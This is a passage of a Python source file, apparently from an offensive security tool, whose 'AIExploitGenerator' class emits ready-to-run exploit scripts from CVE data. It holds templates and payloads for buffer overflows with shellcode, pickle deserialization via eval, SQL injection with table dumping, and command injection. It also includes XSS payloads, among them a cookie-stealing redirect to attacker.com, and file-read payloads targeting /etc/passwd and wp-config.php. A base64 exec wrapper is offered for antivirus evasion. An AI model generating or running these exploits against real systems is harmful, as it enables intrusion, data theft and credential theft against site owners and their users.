{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {status_color}📊 FINAL RESULTS {status_icon}{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}├─────────────────────────────────────────────────────────────────────────────┤{ModernVisualEngine.COLORS['RESET']}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['NEON_BLUE']}🚀 Command:{ModernVisualEngine.COLORS['RESET']} {self.command[:55]}{'...' if len(self.command) > 55 else ''}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['CYBER_ORANGE']}⏱️  Duration:{ModernVisualEngine.COLORS['RESET']} {execution_time:.2f}s{timeout_status}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['WARNING']}📊 Output Size:{ModernVisualEngine.COLORS['RESET']} {output_size} bytes
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {ModernVisualEngine.COLORS['ELECTRIC_PURPLE']}🔢 Exit Code:{ModernVisualEngine.COLORS['RESET']} {self.return_code}
{ModernVisualEngine.COLORS['BOLD']}│{ModernVisualEngine.COLORS['RESET']} {status_color}📈 Status:{ModernVisualEngine.COLORS['RESET']} {'SUCCESS' if success else 'FAILED'} | Cached: Yes
{ModernVisualEngine.COLORS['MATRIX_GREEN']}{ModernVisualEngine.COLORS['BOLD']}╰─────────────────────────────────────────────────────────────────────────────╯{ModernVisualEngine.COLORS['RESET']}
"""

            # Log the beautiful summary
            for line in results_summary.strip().split('\n'):
                if line.strip():
                    logger.info(line)

            return {
                "stdout": self.stdout_data,
                "stderr": self.stderr_data,
                "return_code": self.return_code,
                "success": success,
                "timed_out": self.timed_out,
                "partial_results": self.timed_out and (self.stdout_data or self.stderr_data),
                "execution_time": self.end_time - self.start_time if self.end_time else 0,
                "timestamp": datetime.now().isoformat()
            }

        except Exception as e:
            self.end_time = time.time()
            execution_time = self.end_time - self.start_time if self.start_time else 0

            logger.error(f"💥 ERROR: Command execution failed: {str(e)}")
            logger.error(f"🔍 TRACEBACK: {traceback.format_exc()}")
            telemetry.record_execution(False, execution_time)

            return {
                "stdout": self.stdout_data,
                "stderr": f"Error executing command: {str(e)}\n{self.stderr_data}",
                "return_code": -1,
                "success": False,
                "timed_out": False,
                "partial_results": bool(self.stdout_data or self.stderr_data),
                "execution_time": execution_time,
                "timestamp": datetime.now().isoformat()
            }

# ============================================================================
# DUPLICATE CLASSES REMOVED - Using the first definitions above
# ============================================================================

# ============================================================================
# AI-POWERED EXPLOIT GENERATION SYSTEM (v6.0 ENHANCEMENT)
# ============================================================================
#
# This section contains advanced AI-powered exploit generation capabilities
# for automated vulnerability exploitation and proof-of-concept development.
#
# Features:
# - Automated exploit template generation from CVE data
# - Multi-architecture support (x86, x64, ARM)
# - Evasion technique integration
# - Custom payload generation
# - Exploit effectiveness scoring
#
# ============================================================================



class AIExploitGenerator:
    """AI-powered exploit development and enhancement system"""

    def __init__(self):
        # Extend existing payload templates
        self.exploit_templates = {
            "buffer_overflow": {
                "x86": """
# Buffer Overflow Exploit Template for {cve_id}
# Target: {target_info}
# Architecture: x86

import struct
import socket

def create_exploit():
    # Vulnerability details from {cve_id}
    target_ip = "{target_ip}"
    target_port = {target_port}

    # Buffer overflow payload
    padding = "A" * {offset}
    eip_control = struct.pack("<I", {ret_address})
    nop_sled = "\\x90" * {nop_size}

    # Shellcode ({shellcode_type})
    shellcode = {shellcode}

    exploit = padding + eip_control + nop_sled + shellcode
    return exploit

if __name__ == "__main__":
    payload = create_exploit()
    print(f"Exploit payload generated for {cve_id}")
    print(f"Payload size: {{len(payload)}} bytes")
                """,
                "x64": """
# 64-bit Buffer Overflow Exploit Template for {cve_id}
# Target: {target_info}
# Architecture: x64

import struct
import socket

def create_rop_exploit():
    target_ip = "{target_ip}"
    target_port = {target_port}

    # ROP chain for x64 exploitation
    padding = "A" * {offset}
    rop_chain = [
        {rop_gadgets}
    ]

    rop_payload = "".join([struct.pack("<Q", addr) for addr in rop_chain])
    shellcode = {shellcode}

    exploit = padding + rop_payload + shellcode
    return exploit
                """
            },
            "web_rce": """
# Web-based RCE Exploit for {cve_id}
# Target: {target_info}

import requests
import sys

def exploit_rce(target_url, command):
    # CVE {cve_id} exploitation
    headers = {{
        "User-Agent": "Mozilla/5.0 (Compatible Exploit)",
        "Content-Type": "{content_type}"
    }}

    # Injection payload
    payload = {injection_payload}

    try:
        response = requests.post(target_url, data=payload, headers=headers, timeout=10)
        if response.status_code == 200:
            return response.text
    except Exception as e:
        print(f"Exploit failed: {{e}}")

    return None

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python exploit.py <target_url> <command>")
        sys.exit(1)

    result = exploit_rce(sys.argv[1], sys.argv[2])
    if result:
        print("Exploit successful!")
        print(result)
            """,
            "deserialization": """
# Deserialization Exploit for {cve_id}
# Target: {target_info}

import pickle
import base64
import requests

class ExploitPayload:
    def __reduce__(self):
        return (eval, ('{command}',))

def create_malicious_payload(command):
    payload = ExploitPayload()
    serialized = pickle.dumps(payload)
    encoded = base64.b64encode(serialized).decode()
    return encoded

def send_exploit(target_url, command):
    payload = create_malicious_payload(command)

    data = {{
        "{parameter_name}": payload
    }}

    response = requests.post(target_url, data=data)
    return response.text
            """
        }

        self.evasion_techniques = {
            "encoding": ["url", "base64", "hex", "unicode"],
            "obfuscation": ["variable_renaming", "string_splitting", "comment_injection"],
            "av_evasion": ["encryption", "packing", "metamorphism"],
            "waf_bypass": ["case_variation", "parameter_pollution", "header_manipulation"]
        }

    def generate_exploit_from_cve(self, cve_data, target_info):
        """Generate working exploit from real CVE data with specific implementation"""
        try:
            cve_id = cve_data.get("cve_id", "")
            description = cve_data.get("description", "").lower()
            
            logger.info(f"🛠️ Generating specific exploit for {cve_id}")

            # Enhanced vulnerability classification using real CVE data
            vuln_type, specific_details = self._analyze_vulnerability_details(description, cve_data)
            
            # Generate real, specific exploit based on CVE details
            if vuln_type == "sql_injection":
                exploit_code = self._generate_sql_injection_exploit(cve_data, target_info, specific_details)
            elif vuln_type == "xss":
                exploit_code = self._generate_xss_exploit(cve_data, target_info, specific_details)
            elif vuln_type == "rce" or vuln_type == "web_rce":
                exploit_code = self._generate_rce_exploit(cve_data, target_info, specific_details)
            elif vuln_type == "xxe":
                exploit_code = self._generate_xxe_exploit(cve_data, target_info, specific_details)
            elif vuln_type == "deserialization":
                exploit_code = self._generate_deserialization_exploit(cve_data, target_info, specific_details)
            elif vuln_type == "file_read" or vuln_type == "directory_traversal":
                exploit_code = self._generate_file_read_exploit(cve_data, target_info, specific_details)
            elif vuln_type == "authentication_bypass":
                exploit_code = self._generate_auth_bypass_exploit(cve_data, target_info, specific_details)
            elif vuln_type == "buffer_overflow":
                exploit_code = self._generate_buffer_overflow_exploit(cve_data, target_info, specific_details)
            else:
                # Fallback to intelligent generic exploit
                exploit_code = self._generate_intelligent_generic_exploit(cve_data, target_info, specific_details)

            # Apply evasion techniques if requested
            if target_info.get("evasion_level", "none") != "none":
                exploit_code = self._apply_evasion_techniques(exploit_code, target_info)

            # Generate specific usage instructions
            instructions = self._generate_specific_instructions(vuln_type, cve_data, target_info, specific_details)

            return {
                "success": True,
                "cve_id": cve_id,
                "vulnerability_type": vuln_type,
                "specific_details": specific_details,
                "exploit_code": exploit_code,
                "instructions": instructions,
                "evasion_applied": target_info.get("evasion_level", "none"),
                "implementation_type": "real_cve_based"
            }

        except Exception as e:
            logger.error(f"💥 Error generating exploit for {cve_data.get('cve_id', 'unknown')}: {str(e)}")
            return {"success": False, "error": str(e)}

    def _classify_vulnerability(self, description):
        """Classify vulnerability type from description"""
        if any(keyword in description for keyword in ["buffer overflow", "heap overflow", "stack overflow"]):
            return "buffer_overflow"
        elif any(keyword in description for keyword in ["code execution", "command injection", "rce"]):
            return "web_rce"
        elif any(keyword in description for keyword in ["deserialization", "unserialize", "pickle"]):
            return "deserialization"
        elif any(keyword in description for keyword in ["sql injection", "sqli"]):
            return "sql_injection"
        elif any(keyword in description for keyword in ["xss", "cross-site scripting"]):
            return "xss"
        else:
            return "generic"

    def _select_template(self, vuln_type, target_info):
        """Select appropriate exploit template"""
        if vuln_type == "buffer_overflow":
            arch = target_info.get("target_arch", "x86")
            return self.exploit_templates["buffer_overflow"].get(arch,
                   self.exploit_templates["buffer_overflow"]["x86"])
        elif vuln_type in self.exploit_templates:
            return self.exploit_templates[vuln_type]
        else:
            return "# Generic exploit template for {cve_id}\n# Manual development required"

    def _generate_exploit_parameters(self, cve_data, target_info, vuln_type):
        """Generate parameters for exploit template"""
        params = {
            "cve_id": cve_data.get("cve_id", ""),
            "target_info": target_info.get("description", "Unknown target"),
            "target_ip": target_info.get("target_ip", "192.168.1.100"),
            "target_port": target_info.get("target_port", 80),
            "command": target_info.get("command", "id"),
        }

        if vuln_type == "buffer_overflow":
            params.update({
                "offset": target_info.get("offset", 268),
                "ret_address": target_info.get("ret_address", "0x41414141"),
                "nop_size": target_info.get("nop_size", 16),
                "shellcode": target_info.get("shellcode", '"\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68"'),
                "shellcode_type": target_info.get("shellcode_type", "linux/x86/exec"),
                "rop_gadgets": target_info.get("rop_gadgets", "0x41414141, 0x42424242")
            })
        elif vuln_type == "web_rce":
            params.update({
                "content_type": target_info.get("content_type", "application/x-www-form-urlencoded"),
                "injection_payload": target_info.get("injection_payload", '{"cmd": command}'),
                "parameter_name": target_info.get("parameter_name", "data")
            })

        return params

    def _apply_evasion_techniques(self, exploit_code, target_info):
        """Apply evasion techniques to exploit code"""
        evasion_level = target_info.get("evasion_level", "basic")

        if evasion_level == "basic":
            # Simple string obfuscation
            exploit_code = exploit_code.replace('"', "'")
            exploit_code = f"# Obfuscated exploit\n{exploit_code}"
        elif evasion_level == "advanced":
            # Advanced obfuscation
            exploit_code = self._advanced_obfuscation(exploit_code)

        return exploit_code

    def _advanced_obfuscation(self, code):
        """Apply advanced obfuscation techniques"""
        # This is a simplified version - real implementation would be more sophisticated
        obfuscated = f"""
# Advanced evasion techniques applied
import base64
exec(base64.b64decode('{base64.b64encode(code.encode()).decode()}'))
        """
        return obfuscated

    def _analyze_vulnerability_details(self, description, cve_data):
        """Analyze CVE data to extract specific vulnerability details"""
        import re  # Import at the top of the method
        
        vuln_type = "generic"
        specific_details = {
            "endpoints": [],
            "parameters": [],
            "payload_location": "unknown",
            "software": "unknown",
            "version": "unknown",
            "attack_vector": "unknown"
        }
        
        # Extract specific details from description
        description_lower = description.lower()
        
        # SQL Injection detection and details
        if any(keyword in description_lower for keyword in ["sql injection", "sqli"]):
            vuln_type = "sql_injection"
            # Extract endpoint from description
            endpoint_match = re.search(r'(/[^\s]+\.php[^\s]*)', description)
            if endpoint_match:
                specific_details["endpoints"] = [endpoint_match.group(1)]
            # Extract parameter names
            param_matches = re.findall(r'(?:via|parameter|param)\s+([a-zA-Z_][a-zA-Z0-9_]*)', description)
            if param_matches:
                specific_details["parameters"] = param_matches
                
        # XSS detection
        elif any(keyword in description_lower for keyword in ["cross-site scripting", "xss"]):
            vuln_type = "xss"
            # Extract XSS context
            if "stored" in description_lower:
                specific_details["xss_type"] = "stored"
            elif "reflected" in description_lower:
                specific_details["xss_type"] = "reflected"
            else:
                specific_details["xss_type"] = "unknown"
                
        # XXE detection
        elif any(keyword in description_lower for keyword in ["xxe", "xml external entity"]):
            vuln_type = "xxe"
            specific_details["payload_location"] = "xml"
            
        # File read/traversal detection
        elif any(keyword in description_lower for keyword in ["file read", "directory traversal", "path traversal", "arbitrary file", "file disclosure", "local file inclusion", "lfi", "file inclusion"]):
            vuln_type = "file_read"
            if "directory traversal" in description_lower or "path traversal" in description_lower:
                specific_details["traversal_type"] = "directory"
            elif "local file inclusion" in description_lower or "lfi" in description_lower:
                specific_details["traversal_type"] = "lfi"
            else:
                specific_details["traversal_type"] = "file_read"
            
            # Extract parameter names for LFI
            param_matches = re.findall(r'(?:via|parameter|param)\s+([a-zA-Z_][a-zA-Z0-9_]*)', description)
            if param_matches:
                specific_details["parameters"] = param_matches
                
        # Authentication bypass
        elif any(keyword in description_lower for keyword in ["authentication bypass", "auth bypass", "login bypass"]):
            vuln_type = "authentication_bypass"
            
        # RCE detection
        elif any(keyword in description_lower for keyword in ["remote code execution", "rce", "command injection"]):
            vuln_type = "rce"
            
        # Deserialization
        elif any(keyword in description_lower for keyword in ["deserialization", "unserialize", "pickle"]):
            vuln_type = "deserialization"
            
        # Buffer overflow
        elif any(keyword in description_lower for keyword in ["buffer overflow", "heap overflow", "stack overflow"]):
            vuln_type = "buffer_overflow"
            
        # Extract software and version info
        software_match = re.search(r'(\w+(?:\s+\w+)*)\s+v?(\d+(?:\.\d+)*)', description)
        if software_match:
            specific_details["software"] = software_match.group(1)
            specific_details["version"] = software_match.group(2)
            
        return vuln_type, specific_details

    def _generate_sql_injection_exploit(self, cve_data, target_info, details):
        """Generate specific SQL injection exploit based on CVE details"""
        cve_id = cve_data.get("cve_id", "")
        endpoint = details.get("endpoints", ["/vulnerable.php"])[0] if details.get("endpoints") else "/vulnerable.php"
        parameter = details.get("parameters", ["id"])[0] if details.get("parameters") else "id"
        
        return f'''#!/usr/bin/env python3
# SQL Injection Exploit for {cve_id}
# Vulnerability: {cve_data.get("description", "")[:100]}...
# Target: {details.get("software", "Unknown")} {details.get("version", "")}

import requests
import sys
import time
from urllib.parse import quote

class SQLiExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.endpoint = "{endpoint}"
        self.parameter = "{parameter}"
        self.session = requests.Session()
        
    def test_injection(self):
        """Test if target is vulnerable"""
        print(f"[+] Testing SQL injection on {{self.target_url}}{{self.endpoint}}")
        
        # Time-based blind SQL injection test
        payloads = [
            "1' AND SLEEP(3)--",
            "1' OR SLEEP(3)--",
            "1'; WAITFOR DELAY '00:00:03'--"
        ]
        
        for payload in payloads:
            start_time = time.time()
            try:
                response = self.session.get(
                    f"{{self.target_url}}{{self.endpoint}}",
                    params={{self.parameter: payload}},
                    timeout=10
                )
                elapsed = time.time() - start_time
                
                if elapsed >= 3:
                    print(f"[+] Vulnerable! Payload: {{payload}}")
                    return True
                    
            except requests.exceptions.Timeout:
                print(f"[+] Likely vulnerable (timeout): {{payload}}")
                return True
            except Exception as e:
                continue
                
        return False
    
    def extract_database_info(self):
        """Extract database information"""
        print("[+] Extracting database information...")
        
        queries = {{
            "version": "SELECT VERSION()",
            "user": "SELECT USER()",
            "database": "SELECT DATABASE()"
        }}
        
        results = {{}}
        
        for info_type, query in queries.items():
            payload = f"1' UNION SELECT 1,({query}),3--"
            try:
                response = self.session.get(
                    f"{{self.target_url}}{{self.endpoint}}",
                    params={{self.parameter: payload}}
                )
                
                # Simple extraction (would need customization per application)
                if response.status_code == 200:
                    results[info_type] = "Check response manually"
                    print(f"[+] {{info_type.title()}}: Check response for {{query}}")
                    
            except Exception as e:
                print(f"[-] Error extracting {{info_type}}: {{e}}")
                
        return results
    
    def dump_tables(self):
        """Dump table names"""
        print("[+] Attempting to dump table names...")
        
        # MySQL/MariaDB
        payload = "1' UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema=database()--"
        
        try:
            response = self.session.get(
                f"{{self.target_url}}{{self.endpoint}}",
                params={{self.parameter: payload}}
            )
            
            if response.status_code == 200:
                print("[+] Tables dumped - check response")
                return response.text
                
        except Exception as e:
            print(f"[-] Error dumping tables: {{e}}")
            
        return None

def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
        print(f"Example: python3 {{sys.argv[0]}} http://target.com")
        sys.exit(1)
    
    target_url = sys.argv[1]
    exploit = SQLiExploit(target_url)
    
    print(f"[+] SQL Injection Exploit for {cve_id}")
    print(f"[+] Target: {{target_url}}")
    
    if exploit.test_injection():
        print("[+] Target appears vulnerable!")
        exploit.extract_database_info()
        exploit.dump_tables()
    else:
        print("[-] Target does not appear vulnerable")

if __name__ == "__main__":
    main()
'''

    def _generate_xss_exploit(self, cve_data, target_info, details):
        """Generate specific XSS exploit based on CVE details"""
        cve_id = cve_data.get("cve_id", "")
        xss_type = details.get("xss_type", "reflected")
        
        return f'''#!/usr/bin/env python3
# Cross-Site Scripting (XSS) Exploit for {cve_id}
# Type: {xss_type.title()} XSS
# Vulnerability: {cve_data.get("description", "")[:100]}...

import requests
import sys
from urllib.parse import quote

class XSSExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        
    def generate_payloads(self):
        """Generate XSS payloads for testing"""
        payloads = [
            # Basic XSS
            "<script>alert('XSS-{cve_id}')</script>",
            "<img src=x onerror=alert('XSS-{cve_id}')>",
            "<svg onload=alert('XSS-{cve_id}')>",
            
            # Bypass attempts
            "<script>alert(String.fromCharCode(88,83,83))</script>",
            "javascript:alert('XSS-{cve_id}')",
            "<iframe src=javascript:alert('XSS-{cve_id}')></iframe>",
            
            # Advanced payloads
            "<script>fetch('/admin').then(r=>r.text()).then(d=>alert(d.substr(0,100)))</script>",
            "<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>"
        ]
        
        return payloads
    
    def test_reflected_xss(self, parameter="q"):
        """Test for reflected XSS"""
        print(f"[+] Testing reflected XSS on parameter: {{parameter}}")
        
        payloads = self.generate_payloads()
        
        for i, payload in enumerate(payloads):
            try:
                response = self.session.get(
                    self.target_url,
                    params={{parameter: payload}}
                )
                
                if payload in response.text:
                    print(f"[+] Potential XSS found with payload {{i+1}}: {{payload[:50]}}...")
                    return True
                    
            except Exception as e:
                print(f"[-] Error testing payload {{i+1}}: {{e}}")
                continue
                
        return False
    
    def test_stored_xss(self, endpoint="/comment", data_param="comment"):
        """Test for stored XSS"""
        print(f"[+] Testing stored XSS on endpoint: {{endpoint}}")
        
        payloads = self.generate_payloads()
        
        for i, payload in enumerate(payloads):
            try:
                # Submit payload
                response = self.session.post(
                    f"{{self.target_url}}{{endpoint}}",
                    data={{data_param: payload}}
                )
                
                # Check if stored
                check_response = self.session.get(self.target_url)
                if payload in check_response.text:
                    print(f"[+] Stored XSS found with payload {{i+1}}: {{payload[:50]}}...")
                    return True
                    
            except Exception as e:
                print(f"[-] Error testing stored payload {{i+1}}: {{e}}")
                continue
                
        return False

def main():
    if len(sys.argv) < 2:
        print(f"Usage: python3 {{sys.argv[0]}} <target_url> [parameter]")
        print(f"Example: python3 {{sys.argv[0]}} http://target.com/search q")
        sys.exit(1)
    
    target_url = sys.argv[1]
    parameter = sys.argv[2] if len(sys.argv) > 2 else "q"
    
    exploit = XSSExploit(target_url)
    
    print(f"[+] XSS Exploit for {cve_id}")
    print(f"[+] Target: {{target_url}}")
    
    if "{xss_type}" == "reflected" or "{xss_type}" == "unknown":
        if exploit.test_reflected_xss(parameter):
            print("[+] Reflected XSS vulnerability confirmed!")
        else:
            print("[-] No reflected XSS found")
    
    if "{xss_type}" == "stored" or "{xss_type}" == "unknown":
        if exploit.test_stored_xss():
            print("[+] Stored XSS vulnerability confirmed!")
        else:
            print("[-] No stored XSS found")

if __name__ == "__main__":
    main()
'''

    def _generate_file_read_exploit(self, cve_data, target_info, details):
        """Generate file read/directory traversal exploit"""
        cve_id = cve_data.get("cve_id", "")
        parameter = details.get("parameters", ["portal_type"])[0] if details.get("parameters") else "portal_type"
        traversal_type = details.get("traversal_type", "file_read")
        
        return f'''#!/usr/bin/env python3
# Local File Inclusion (LFI) Exploit for {cve_id}
# Vulnerability: {cve_data.get("description", "")[:100]}...
# Parameter: {parameter}
# Type: {traversal_type}

import requests
import sys
from urllib.parse import quote

class FileReadExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        
    def generate_payloads(self, target_file="/etc/passwd"):
        """Generate directory traversal payloads"""
        payloads = [
            # Basic traversal
            "../" * 10 + target_file.lstrip('/'),
            "..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
            
            # URL encoded
            quote("../") * 10 + target_file.lstrip('/'),
            
            # Double encoding
            quote(quote("../")) * 10 + target_file.lstrip('/'),
            
            # Null byte (for older systems)
            "../" * 10 + target_file.lstrip('/') + "%00.txt",
            
            # Absolute paths
            target_file,
            "file://" + target_file,
            
            # Windows paths
            "C:\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts",
            "C:/windows/system32/drivers/etc/hosts"
        ]
        
        return payloads
    
    def test_file_read(self, parameter="{parameter}"):
        """Test LFI vulnerability on WordPress"""
        print(f"[+] Testing LFI on parameter: {{parameter}}")
        
        # WordPress-specific files and common targets
        test_files = [
            "/etc/passwd",
            "/etc/hosts", 
            "/proc/version",
            "/var/www/html/wp-config.php",
            "/var/log/apache2/access.log",
            "/var/log/nginx/access.log",
            "../../../../etc/passwd",
            "php://filter/convert.base64-encode/resource=wp-config.php"
        ]
        
        for target_file in test_files:
            payloads = self.generate_payloads(target_file)
            
            for i, payload in enumerate(payloads):
                try:
                    response = self.session.get(
                        self.target_url,
                        params={{parameter: payload}}
                    )
                    
                    # Check for common file contents
                    indicators = [
                        "root:", "daemon:", "bin:", "sys:",  # /etc/passwd
                        "localhost", "127.0.0.1",  # hosts file
                        "Linux version", "Microsoft Windows",  # system info
                        "<?php", "#!/bin/"  # code files
                    ]
                    
                    if any(indicator in response.text for indicator in indicators):
                        print(f"[+] File read successful!")
                        print(f"[+] File: {{target_file}}")
                        print(f"[+] Payload: {{payload}}")
                        print(f"[+] Content preview: {{response.text[:200]}}...")
                        return True
                        
                except Exception as e:
                    continue
                    
        return False
    
    def read_specific_file(self, filepath, parameter="file"):
        """Read a specific file"""
        print(f"[+] Attempting to read: {{filepath}}")
        
        payloads = self.generate_payloads(filepath)
        
        for payload in payloads:
            try:
                response = self.session.get(
                    self.target_url,
                    params={{parameter: payload}}
                )
                
                if response.status_code == 200 and len(response.text) > 10:
                    print(f"[+] Successfully read {{filepath}}:")
                    print("-" * 50)
                    print(response.text)
                    print("-" * 50)
                    return response.text
                    
            except Exception as e:
                continue
                
        print(f"[-] Could not read {{filepath}}")
        return None

def main():
    if len(sys.argv) < 2:
        print(f"Usage: python3 {{sys.argv[0]}} <target_url> [parameter] [file_to_read]")
        print(f"Example: python3 {{sys.argv[0]}} http://target.com/view file /etc/passwd")
        sys.exit(1)
    
    target_url = sys.argv[1]
    parameter = sys.argv[2] if len(sys.argv) > 2 else "file"
    specific_file = sys.argv[3] if len(sys.argv) > 3 else None
    
    exploit = FileReadExploit(target_url)
    
    print(f"[+] File Read Exploit for {cve_id}")
    print(f"[+] Target: {{target_url}}")
    
    if specific_file:
        exploit.read_specific_file(specific_file, parameter)
    else:
        if exploit.test_file_read(parameter):
            print("[+] File read vulnerability confirmed!")
        else:
            print("[-] No file read vulnerability found")

if __name__ == "__main__":
    main()
'''

    def _generate_intelligent_generic_exploit(self, cve_data, target_info, details):
        """Generate intelligent generic exploit based on CVE analysis"""
        cve_id = cve_data.get("cve_id", "")
        description = cve_data.get("description", "")
        
        return f'''#!/usr/bin/env python3
# Generic Exploit for {cve_id}
# Vulnerability: {description[:150]}...
# Generated based on CVE analysis

import requests
import sys
import json

class GenericExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        self.cve_id = "{cve_id}"
        
    def analyze_target(self):
        """Analyze target for vulnerability indicators"""
        print(f"[+] Analyzing target for {cve_id}")
        
        try:
            response = self.session.get(self.target_url)
            
            # Look for version indicators in response
            headers = response.headers
            content = response.text.lower()
            
            print(f"[+] Server: {{headers.get('Server', 'Unknown')}}")
            print(f"[+] Status Code: {{response.status_code}}")
            
            # Check for software indicators
            software_indicators = [
                "{details.get('software', '').lower()}",
                "version {details.get('version', '')}",
            ]
            
            for indicator in software_indicators:
                if indicator and indicator in content:
                    print(f"[+] Found software indicator: {{indicator}}")
                    return True
                    
        except Exception as e:
            print(f"[-] Error analyzing target: {{e}}")
            
        return False
    
    def test_vulnerability(self):
        """Test for vulnerability presence"""
        print(f"[+] Testing for {cve_id} vulnerability...")
        
        # Based on CVE description, generate test cases
        test_endpoints = [
            "/",
            "/admin",
            "/api",
            "/login"
        ]
        
        for endpoint in test_endpoints:
            try:
                response = self.session.get(f"{{self.target_url}}{{endpoint}}")
                print(f"[+] {{endpoint}}: {{response.status_code}}")
                
                # Look for error messages or indicators
                if response.status_code in [200, 500, 403]:
                    print(f"[+] Endpoint {{endpoint}} accessible")
                    
            except Exception as e:
                continue
                
        return True
    
    def exploit(self):
        """Attempt exploitation based on CVE details"""
        print(f"[+] Attempting exploitation of {cve_id}")
        
        # This would be customized based on the specific CVE
        print(f"[!] Manual exploitation required for {cve_id}")
        print(f"[!] Vulnerability details: {{'{description[:200]}...'}}")
        
        return False

def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {{sys.argv[0]}} <target_url>")
        print(f"Example: python3 {{sys.argv[0]}} http://target.com")
        sys.exit(1)
    
    target_url = sys.argv[1]
    exploit = GenericExploit(target_url)
    
    print(f"[+] Generic Exploit for {cve_id}")
    print(f"[+] Target: {{target_url}}")
    
    if exploit.analyze_target():
        print("[+] Target may be vulnerable")
        exploit.test_vulnerability()
        exploit.exploit()
    else:
        print("[-] Target does not appear to match vulnerability profile")

if __name__ == "__main__":
    main()
'''

    def _generate_specific_instructions(self, vuln_type, cve_data, target_info, details):
        """Generate specific usage instructions based on vulnerability type"""
        cve_id = cve_data.get("cve_id", "")
        
        base_instructions = f"""# Exploit for {cve_id}
# Vulnerability Type: {vuln_type}
# Software: {details.get('software', 'Unknown')} {details.get('version', '')}

## Vulnerability Details:
{cve_data.get('description', 'No description available')[:300]}...

## Usage Instructions:
1. Ensure target is running vulnerable software version
2. Test in authorized environment only
3. Adjust parameters based on target configuration
4. Monitor for defensive responses

## Basic Usage:
python3 exploit.py <target_url>"""

        if vuln_type == "sql_injection":
            return base_instructions + f"""

## SQL Injection Specific:
- Parameter: {details.get('parameters', ['unknown'])[0]}
- Endpoint: {details.get('endpoints', ['unknown'])[0]}
- Test with: python3 exploit.py http://target.com
- The script will automatically test for time-based blind SQL injection
- If successful, it will attempt to extract database information

## Manual Testing:
- Add ' after parameter value to test for errors
- Use SLEEP() or WAITFOR DELAY for time-based testing
- Try UNION SELECT for data extraction"""

        elif vuln_type == "xss":
            return base_instructions + f"""

## XSS Specific:
- Type: {details.get('xss_type', 'unknown')}
- Test with: python3 exploit.py http://target.com parameter_name
- The script tests both reflected and stored XSS
- Payloads include basic and advanced bypass techniques

## Manual Testing:
- Try <script>alert('XSS')</script>
- Use event handlers: <img src=x onerror=alert('XSS')>
- Test for filter bypasses"""

        elif vuln_type == "file_read":
            return base_instructions + f"""

## File Read/Directory Traversal:
- Test with: python3 exploit.py http://target.com file_parameter
- Automatically tests common files (/etc/passwd, etc.)
- Includes encoding and bypass techniques

## Manual Testing:
- Try ../../../etc/passwd
- Test Windows paths: ..\\..\\..\\windows\\system32\\drivers\\etc\\hosts
- Use URL encoding for bypasses"""

        return base_instructions + f"""

## General Testing:
- Run: python3 exploit.py <target_url>
- Check target software version matches vulnerable range
- Monitor application logs for exploitation attempts
- Verify patch status before testing"""

    def _generate_rce_exploit(self, cve_data, target_info, details):
        """Generate RCE exploit based on CVE details"""
        cve_id = cve_data.get("cve_id", "")
        
        return f'''#!/usr/bin/env python3
# Remote Code Execution Exploit for {cve_id}
# Vulnerability: {cve_data.get("description", "")[:100]}...

import requests
import sys
import subprocess
from urllib.parse import quote

class RCEExploit:
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = requests.Session()
        
    def test_rce(self, command="id"):
        """Test for RCE vulnerability"""
        print(f"[+] Testing RCE with command: {{command}}")
        
        # Common RCE payloads
        payloads = [
            # Command injection
            f"; {{command}}",
            f"| {{command}}",
            f"&& {{command}}",
            f"|| {{command}}",
            
            # Template injection
            f"${{{{{{command}}}}}}",
            f"{{{{{{command}}}}}}",
            
            # Deserialization payloads
            f"{{command}}",
            
            # OS command injection
            f"`{{command}}`",
            f"$({{command}})",
        ]
        
        for i, payload in enumerate(payloads):
            try:
                # Test GET parameters
                response = self.session.get(
                    self.target_url,
                    params={{"cmd": payload, "exec": payload, "system": payload}}
                )
                
                # Look for command output indicators
                if self._check_rce_indicators(response.text, command):
                    print(f"[+] RCE found with payload {{i+1}}: {{payload}}")
                    return True
                
                # Test POST data
                response = self.session.post(
                    self.target_url,
                    data={{"cmd": payload, "exec": payload, "system": payload}}
                )
                
                if self._check_rce_indicators(response.text, command):
                    print(f"[+] RCE found with POST payload {{i+1}}: {{payload}}")
                    return True
                    
            except Exception as e:
                continue
                
        return False
    
    def _check_rce_indicators(self, response_text, command):
        """Check response for RCE indicators"""
        if command == "id":
            indicators = ["uid=", "gid=", "groups="]
        elif command == "whoami":
            indicators = ["root", "www-data", "apache", "nginx"]
        elif command == "pwd":
            indicators = ["/", "\\\\", "C:"]
        else:
            indicators = [command]
            
        return any(indicator in response_text for indicator in indicators)
    
    def execute_command(self, command):
        """Execute a specific command"""
        print(f"[+] Executing command: {{command}}")
        
        if self.test_rce(command):
            print(f"[+] Command executed successfully")
            return True
        else:
            print(f"[-] Command execution failed")
            return False

def main():
    if len(sys.argv) < 2:
        print(f"Usage: python3 {{sys.argv[0]}} <target_url> [command]")
        print(f"Example: python3 {{sys.argv[0]}} http://target.com id")
        sys.exit(1)
    
    target_url = sys.argv[1]
    command = sys.argv[2] if len(sys.argv) > 2 else "id"
    
    exploit = RCEExploit(target_url)
